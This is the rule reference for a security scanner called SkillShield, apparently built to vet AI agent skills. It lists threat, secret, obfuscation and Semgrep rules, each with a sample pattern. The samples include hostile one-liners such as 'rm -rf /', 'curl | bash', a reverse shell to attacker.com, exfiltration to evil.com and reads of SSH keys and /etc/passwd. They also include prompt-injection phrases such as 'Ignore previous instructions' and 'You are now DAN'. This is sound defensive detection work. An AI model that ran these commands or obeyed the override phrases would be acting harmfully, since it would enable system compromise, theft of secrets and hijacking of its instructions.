# Security Scanner Rules

SkillShield uses a multi-layer security scanner to detect threats, secrets, obfuscation, and code-quality issues. This document lists all built-in rules.

---

## Layer 1: Threat Patterns (72 rules)

Layer 1 detects 72 threat patterns across 12 categories. Each finding is assigned a severity based on potential impact.

| Rule ID | Category | Severity | Description | Example Pattern |
|---------|----------|----------|-------------|-----------------|
| SS-THREAT-001 | Command Injection | CRITICAL | Shell command execution via backticks | `` `rm -rf /` `` |
| SS-THREAT-002 | Command Injection | CRITICAL | Child process spawn with user input | `child_process.exec(...)` |
| SS-THREAT-003 | Command Injection | CRITICAL | OS command via eval-like construct | `eval("os.system(...)")` |
| SS-THREAT-004 | Command Injection | HIGH | Bash pipe injection | `\| sh` |
| SS-THREAT-005 | Command Injection | HIGH | PowerShell execution string | `powershell -Command "..."` |
| SS-THREAT-006 | Command Injection | HIGH | Perl/Python backtick operator | `` `whoami` `` |
| SS-THREAT-007 | Data Exfiltration | CRITICAL | HTTP POST of sensitive data | `fetch('https://evil.com', {body: data})` |
| SS-THREAT-008 | Data Exfiltration | CRITICAL | DNS tunneling payload | `dns.resolve('data.evil.com')` |
| SS-THREAT-009 | Data Exfiltration | HIGH | Exfiltration via WebSocket | `new WebSocket('wss://...')` |
| SS-THREAT-010 | Data Exfiltration | HIGH | Encoding data for outbound request | `btoa(secrets)` |
| SS-THREAT-011 | Data Exfiltration | HIGH | Clipboard extraction | `navigator.clipboard.readText()` |
| SS-THREAT-012 | Data Exfiltration | MEDIUM | Environment variable leak in log | `console.log(process.env)` |
| SS-THREAT-013 | Credential Harvesting | CRITICAL | Hardcoded password in source | `password = "secret123"` |
| SS-THREAT-014 | Credential Harvesting | CRITICAL | API key in plaintext | `api_key = "sk-..."` |
| SS-THREAT-015 | Credential Harvesting | HIGH | Token extraction from config | `config.token` |
| SS-THREAT-016 | Credential Harvesting | HIGH | SSH key collection | `fs.readFile('~/.ssh/id_rsa')` |
| SS-THREAT-017 | Credential Harvesting | HIGH | Browser cookie theft | `document.cookie` |
| SS-THREAT-018 | Credential Harvesting | MEDIUM | Credential sniffing via prompt | `prompt("Enter password:")` |
| SS-THREAT-019 | Prompt Injection | CRITICAL | Delimiter override attack | `\"\"\" Ignore previous instructions` |
| SS-THREAT-020 | Prompt Injection | CRITICAL | System prompt leak via repetition | `Repeat the words above` |
| SS-THREAT-021 | Prompt Injection | HIGH | Role-play jailbreak | `You are now DAN` |
| SS-THREAT-022 | Prompt Injection | HIGH | Indirect injection via URL | `fetch('https://evil.com/payload')` |
| SS-THREAT-023 | Prompt Injection | MEDIUM | Markup wrapping to hide instructions | `<!-- ignore -->` |
| SS-THREAT-024 | Prompt Injection | MEDIUM | Token smuggling with synonyms | `synonym-for-ignore` |
| SS-THREAT-025 | Obfuscation | CRITICAL | Hex-encoded executable payload | `\x41\x42\x43...` |
| SS-THREAT-026 | Obfuscation | CRITICAL | Base64-encoded malware dropper | `atob('dmFy...')` |
| SS-THREAT-027 | Obfuscation | HIGH | JavaScript code packed with `eval` | `eval(function(...))` |
| SS-THREAT-028 | Obfuscation | HIGH | String concatenation to bypass filters | `'e'+'v'+'a'+'l'` |
| SS-THREAT-029 | Obfuscation | HIGH | Dead code insertion | `if (false) { ... }` |
| SS-THREAT-030 | Obfuscation | MEDIUM | Variable name randomization | `var _0x1234 = ...` |
| SS-THREAT-031 | Sensitive File Access | CRITICAL | Reading `/etc/passwd` | `fs.readFile('/etc/passwd')` |
| SS-THREAT-032 | Sensitive File Access | CRITICAL | Windows SAM hive access | `\\WINDOWS\\system32\\config\\SAM` |
| SS-THREAT-033 | Sensitive File Access | HIGH | `.env` file read | `fs.readFile('.env')` |
| SS-THREAT-034 | Sensitive File Access | HIGH | SSH directory enumeration | `fs.readdir('~/.ssh')` |
| SS-THREAT-035 | Sensitive File Access | HIGH | Browser profile access | `~/Library/Application Support/...` |
| SS-THREAT-036 | Sensitive File Access | MEDIUM | Temporary file harvesting | `/tmp/*` |
| SS-THREAT-037 | External Calls | CRITICAL | Download and execute remote script | `curl \| bash` |
| SS-THREAT-038 | External Calls | CRITICAL | Dynamic import from untrusted URL | `import('https://evil.com/mod.js')` |
| SS-THREAT-039 | External Calls | HIGH | Reverse shell connection | `net.connect('attacker.com', 4444)` |
| SS-THREAT-040 | External Calls | HIGH | DNS lookup for C2 beacon | `dns.lookup('c2.evil.com')` |
| SS-THREAT-041 | External Calls | MEDIUM | Telemetry to unknown endpoint | `fetch('https://analytics.xyz')` |
| SS-THREAT-042 | External Calls | MEDIUM | GitHub raw content fetch | `fetch('https://raw.githubusercontent.com/...')` |
| SS-THREAT-043 | Persistence | CRITICAL | Cron job backdoor | `crontab -e` or `/etc/cron.d` |
| SS-THREAT-044 | Persistence | CRITICAL | Registry run key modification | `reg add HKLM\\...\\Run` |
| SS-THREAT-045 | Persistence | HIGH | Service installation | `systemctl enable backdoor` |
| SS-THREAT-046 | Persistence | HIGH | Startup folder payload | `~/Library/LaunchAgents/...` |
| SS-THREAT-047 | Persistence | MEDIUM | Bash profile modification | `echo '...' >> ~/.bashrc` |
| SS-THREAT-048 | Persistence | MEDIUM | Browser extension sideloading | `chrome.extensions.load(...)` |
| SS-THREAT-049 | Social Engineering | HIGH | Fake login prompt injection | `document.write('<form>Login')` |
| SS-THREAT-050 | Social Engineering | HIGH | Phishing link obfuscation | `href="https://evil.com" text="https://bank.com"` |
| SS-THREAT-051 | Social Engineering | MEDIUM | Fake system dialog | `alert("System infected")` |
| SS-THREAT-052 | Social Engineering | MEDIUM | Impersonation of trusted tool | `console.log("[npm] Installing...")` |
| SS-THREAT-053 | Social Engineering | LOW | Misleading error message | `throw new Error("Call support at 1-800...")` |
| SS-THREAT-054 | Social Engineering | LOW | Urgency/fear manipulation strings | `"Your account will be deleted"` |
| SS-THREAT-055 | ClickFix Attack | CRITICAL | Fake browser update download | `"Chrome Update Required" + .exe` |
| SS-THREAT-056 | ClickFix Attack | CRITICAL | Fake CAPTCHA payload | `"Press Win+R then paste"` |
| SS-THREAT-057 | ClickFix Attack | HIGH | Fake antivirus alert with download | `"Your PC is infected. Download fix"` |
| SS-THREAT-058 | ClickFix Attack | HIGH | Fake PDF viewer extension prompt | `"Install PDF viewer to continue"` |
| SS-THREAT-059 | ClickFix Attack | MEDIUM | Fake plugin update | `"Update Flash Player"` |
| SS-THREAT-060 | ClickFix Attack | MEDIUM | Fake OS dialog via HTML | `<div class="macos-alert">` |
| SS-THREAT-061 | Staged Malware | CRITICAL | Stage 1 downloader fetching Stage 2 | `fetch('stage2.bin')` |
| SS-THREAT-062 | Staged Malware | CRITICAL | Polymorphic payload retrieval | `eval(atob(stage2))` |
| SS-THREAT-063 | Staged Malware | HIGH | Droppers writing to disk | `fs.writeFile('/tmp/payload', data)` |
| SS-THREAT-064 | Staged Malware | HIGH | Encrypted payload loader | `decrypt(loader, key)` |
| SS-THREAT-065 | Staged Malware | MEDIUM | Legitimate tool abuse (LOLBin) | `certutil -urlcache -split -f` |
| SS-THREAT-066 | Staged Malware | MEDIUM | Living-off-the-land script execution | `wscript //e:jscript` |
| SS-THREAT-067 | Second-Order Injection | CRITICAL | Stored payload executed later | `db.save(userInput); later: eval(saved)` |
| SS-THREAT-068 | Second-Order Injection | CRITICAL | Configuration injection triggering command | `config.load(inject); run()` |
| SS-THREAT-069 | Second-Order Injection | HIGH | Log file poisoning to code execution | `fs.appendFile('log', payload); include('log')` |
| SS-THREAT-070 | Second-Order Injection | HIGH | Template stored in DB rendered unsafely | `db.get('tpl'); render(tpl)` |
| SS-THREAT-071 | Second-Order Injection | MEDIUM | Indirect file write leading to include | `upload('img', payload); include('uploads/img')` |
| SS-THREAT-072 | Second-Order Injection | MEDIUM | Delayed eval via event queue | `setTimeout(userCode, 0)` |

---

## Layer 2: Secret Detection (14 rules)

Layer 2 scans for 14 types of exposed secrets and credentials.

| Rule ID | Category | Severity | Description | Example Pattern |
|---------|----------|----------|-------------|-----------------|
| SS-SECRET-001 | OpenAI API Key | CRITICAL | OpenAI API key exposure | `sk-...` |
| SS-SECRET-002 | Anthropic API Key | CRITICAL | Anthropic API key exposure | `sk-ant-...` |
| SS-SECRET-003 | AWS Access Key | CRITICAL | AWS IAM access key | `AKIA...` |
| SS-SECRET-004 | GitHub Token | CRITICAL | GitHub personal access token | `ghp_...` |
| SS-SECRET-005 | Private Key | CRITICAL | RSA/EC/DSA private key block | `-----BEGIN RSA PRIVATE KEY-----` |
| SS-SECRET-006 | Database URL | HIGH | Database connection string with credentials | `postgres://user:pass@host` |
| SS-SECRET-007 | Slack Token | CRITICAL | Slack bot or user token | `xoxb-...` |
| SS-SECRET-008 | Discord Token | CRITICAL | Discord bot token | `MTk...` |
| SS-SECRET-009 | Stripe Key | CRITICAL | Stripe secret or restricted key | `sk_live_...` |
| SS-SECRET-010 | JWT | HIGH | JSON Web Token in source | `eyJ...` |
| SS-SECRET-011 | Generic API Key | HIGH | Common API key patterns | `api-key: "..."` |
| SS-SECRET-012 | Password | HIGH | Hardcoded password assignment | `password = "..."` |
| SS-SECRET-013 | Generic Secret | MEDIUM | Generic secret or token | `secret = "..."` |
| SS-SECRET-014 | Credential String | MEDIUM | Credential or auth string | `credentials: "..."` |

---

## Layer 3: Obfuscation Checks (10 rules)

Layer 3 detects encoding and obfuscation techniques used to hide malicious content.

| Rule ID | Category | Severity | Description | Example Pattern |
|---------|----------|----------|-------------|-----------------|
| SS-OBF-001 | Hex Encoding | HIGH | Hex-encoded strings or code | `\x68\x65\x6c\x6c\x6f` |
| SS-OBF-002 | Base64 Encoding | HIGH | Base64-encoded payloads | `b64decode("...")` |
| SS-OBF-003 | Zero-Width Unicode | MEDIUM | Invisible Unicode characters | `\u200b\u200c\u200d` |
| SS-OBF-004 | Homoglyphs | MEDIUM | Visually similar character substitution | `аdmin` (Cyrillic `а`) |
| SS-OBF-005 | String Reversal | MEDIUM | Reversed strings decoded at runtime | `"olleh".split("").reverse()` |
| SS-OBF-006 | String.fromCharCode | HIGH | Char code sequence to hide strings | `String.fromCharCode(104,101,108,108,111)` |
| SS-OBF-007 | Multi-Layer Encoding | CRITICAL | Nested encoding schemes | `atob(unescape(decodeURIComponent(...)))` |
| SS-OBF-008 | Eval with Encoded Input | CRITICAL | `eval` or `Function` executing encoded data | `eval(atob("dmFy..."))` |
| SS-OBF-009 | Broken Concatenation | HIGH | Split strings concatenated at runtime | `'e'+'v'+'a'+'l'` |
| SS-OBF-010 | Encoding Density | MEDIUM | Abnormally high ratio of encoded to plain text | `>70%` non-ASCII printable |

---

## Semgrep Built-in Rules (15 rules)

SkillShip includes 15 Semgrep rules for deep code analysis.

| Rule ID | Category | Severity | Description | Example Pattern |
|---------|----------|----------|-------------|-----------------|
| SS-SHELL-001 | Shell Injection | CRITICAL | Unsanitized input passed to shell execution | `os.system(user_input)` |
| SS-SHELL-002 | Command Injection | CRITICAL | Command execution with user-controlled data | `exec(req.query.cmd)` |
| SS-SHELL-003 | Backtick Execution | CRITICAL | Shell command via backtick operator | `` `ls ${dir}` `` |
| SS-SHELL-004 | Pipe to Shell | ERROR | Piping output directly to shell | `echo ... \| sh` |
| SS-SECRETS-001 | Hardcoded Secret | CRITICAL | Hardcoded password or key in source | `password = "12345"` |
| SS-SECRETS-002 | Token Exposure | ERROR | API token committed to code | `api_token = "..."` |
| SS-SECRETS-003 | Private Key Leak | CRITICAL | Private key block in repository | `-----BEGIN PRIVATE KEY-----` |
| SS-NETWORK-001 | SSRF | CRITICAL | Server-Side Request Forgery | `fetch(req.query.url)` |
| SS-NETWORK-002 | Open Redirect | ERROR | User-controlled redirect URL | `res.redirect(req.query.next)` |
| SS-NETWORK-003 | Unrestricted Outbound | WARNING | Unrestricted outbound network request | `fetch('https://example.com')` |
| SS-CODE-001 | Dangerous Eval | CRITICAL | Use of eval with untrusted input | `eval(user_input)` |
| SS-CODE-002 | Unsafe Function | CRITICAL | Function constructor with dynamic input | `new Function(user_input)` |
| SS-CODE-003 | Prototype Pollution | ERROR | Potential prototype pollution sink | `obj[key] = value` |
| SS-INJ-001 | SQL Injection | CRITICAL | Unsanitized SQL query construction | `db.query("SELECT * WHERE id = " + req.id)` |
| SS-INJ-002 | NoSQL Injection | ERROR | Unsanitized NoSQL operator | `{ $where: userInput }` |
